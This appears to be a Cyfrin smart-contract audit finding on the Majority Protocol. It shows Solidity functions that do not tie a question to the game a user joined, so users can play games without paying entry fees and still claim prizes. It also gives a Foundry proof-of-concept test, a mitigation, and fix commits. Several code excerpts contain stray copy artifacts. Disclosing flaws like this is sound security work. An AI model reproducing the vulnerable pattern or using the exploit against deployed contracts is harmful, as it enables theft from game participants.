---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - sector/gaming
  - sector/stable
  - sector/vault
protocol: "[[Majority Protocol]]"
auditors:
  - "[[Dacian]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-27-cyfrin-majority-protocol-v2.0.md"
genome:
  - "[[broken-logic]]"
  - "[[reward-theft]]"
  - "[[timestamp-dependence]]"
---
# Users can participate in an infinite number of games they haven't joined, bypassing all entry fee requirements while still becoming winners and claiming prizes

- id: 65374
- impact: HIGH
- protocol: [[Majority Protocol]]
- reporter: Dacian (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-27-cyfrin-majority-protocol-v2.0.md

## Summary


The bug report is about a function called `SessionManager::commitReaction` which only checks if the user has joined a specific game, but doesn't verify if the question they are answering belongs to that game. This can allow a malicious user to bypass game entry fees and participate in an infinite number of games for free. The report also mentions that this bug has been fixed in recent commits.

## Details

**Description:** `SessionManager::commitReaction` only checks that the user has joined `_gameId`, but doesn't verify that `_questionId` belongs to `_gameId`:
```solidity
 function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit)
        external
        onlyState(_gameId, SessionState.Ongoing)
    {
        require(contestants[_gameId][msg.sender], NotJoined(msg.sender, _gameId));
        IPromptStrategy(questionCommitment[_questionId].promptStrategy).commitReaction(
            _gameId, _questionId, _commit, msg.sender
        );
    }
```

Then in the strategy contracts `commitReaction` also doesn't validate this; it just saves the user's reaction into `reactions[_questionId][_user]` which has no associated to any `gameId`:
```solidity
 function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit, address _user) external {
        require(revealedAt[_questionId] != 0, QuestionNotRevealed(_questionId));
        require(
            revealedQuestions[_questionId].sessionManager == msg.sender,
            OnlySessionManager(revealedQuestions[_questionId].sessionManager, msg.sender)
        );
        require(
            revealedAt[_questionId] + revealedQuestions[_questionId].reactionDeadline > block.timestamp, /
            ReactionDeadlinePassed(_user, _questionId)
        );
        Reaction storage r = reactions[_questionId][_user];
        require(r.baseReaction.timestamp == 0, AnswerAlreadyCommitted(_user, _gameId, _questionId));

        r.baseReaction.commit = _commit; <
---
---
        r.baseReaction.timestamp = block.timestamp;

        emit AnswerCommitted(_gameId, _questionId, _user, _commit);
    }
```

Similarly `SessionManager::revealReactions` also doesn't check that `_questionId` is associated with `_gameId`:
```solidity
  function revealReaction(
        uint256 _gameId,
        uint256 _questionId,
        bytes calldata _selection,
        uint256 salt,
        address _user
    ) external {
        uint16 selection = abi.decode(_selection, (uint16));
        require(
            revealedQuestions[_questionId].sessionManager == msg.sender,
            OnlySessionManager(revealedQuestions[_questionId].sessionManager, msg.sender)
        );
        Reaction storage r = reactions[_questionId][_user];
        require(r.baseReaction.timestamp != 0, AnswerNotCommitted(_user, _gameId, _questionId));
        require(!r.baseReaction.revealed, AnswerAlreadyRevealed(_user, _gameId, _questionId));
        require(
            keccak256(abi.encodePacked(_gameId, _questionId, selection, salt)) == r.baseReaction.commit,
            RevealMismatch(_gameId, _questionId, selection, salt, r.baseReaction.commit)
        );

        r.answer = selection;<
---
---
        r.baseReaction.revealed = true;<-
---
---
        address[][] storage choiceCounter = choiceCounters[_questionId];
        uint256 choicesLength = revealedQuestions[_questionId].choices.length;
        if (choiceCounter.length == 0) {
            // set length of choiceCounter to choicesLength
            assembly {
                sstore(choiceCounter.slot, add(sload(choiceCounter.slot), choicesLength))
            }
        }
        choiceCounters[_questionId][selection].push(_user); <-
---
---
        emit AnswerRevealed(_gameId, _questionId, _user, selection);
    }
```

**Impact:** A malicious user can permanently bypass all game entry fees by joining one game; they can even create their own game with zero `ticketPrice`, join it and then participate in an infinite number of games for free.

Such users gain a huge competitive advantage of other users since they bypass game entry fees but can still become winners and claim winnings.

**Proof of Concept:** Run this POC in `SessionManagerReactions.t.sol`
```solidity
 function test_commitReaction_anotherGame() public {
        //@audit
        _createGame();
        _startGame();

        // create and start second game
        _createGame();
        uint256 startTime = sessionManager.getStartTime(2);
        vm.warp(startTime);

        // mint and join contestants

        for (uint256 i = 1; i < contestants.length; i++) {
            //start from 1; doing joint the contestant 0 to the second game
            // mint
            contestants[i] = makeAddr(string(abi.encodePacked("contestant-", Strings.toString(i))));
            TestUSDC(usdc).mint(contestants[i], 10 ether);

            // join
            vm.startPrank(contestants[i]);
            TestUSDC(usdc).approve(address(sessionManager), 10 ether);
            sessionManager.joinGame(2);
            vm.stopPrank();
        }

        //start the game
        sessionManager.startAndRevealGameQuestion(2, 1, abi.encode(question), salt); // game2 question 1

        bytes32 commit = keccak256(abi.encodePacked("test commit"));

        vm.prank(contestants[0]);
        sessionManager.commitReaction(1, 1, commit); //contestant 0 enter in the first game not the second // passing the first game but participating in the question 1 that belong to the second game
    }
```

**Recommended Mitigation:** When users perform *all* game-related actions, validate that:
* they have actually joined the game
* their input `questionId` belongs to their input `gameId`

**Majority Games:**

Fixed in commits [62cafca](https://github.com/Engage-Protocol/engage-protocol/commit/62cafcafd1bfbdb73809d0cd01c746e3586183b9), [01d5cc2](https://github.com/Engage-Protocol/engage-protocol/commit/01d5cc27f9ce72f0666083a2e37959c61ba58649), [f0e77f9](https://github.com/Engage-Protocol/engage-protocol/commit/f0e77f97da55310d8cb8c0a04096f5d3ef480b55).

**Cyfrin:** Verified.

\clearpage
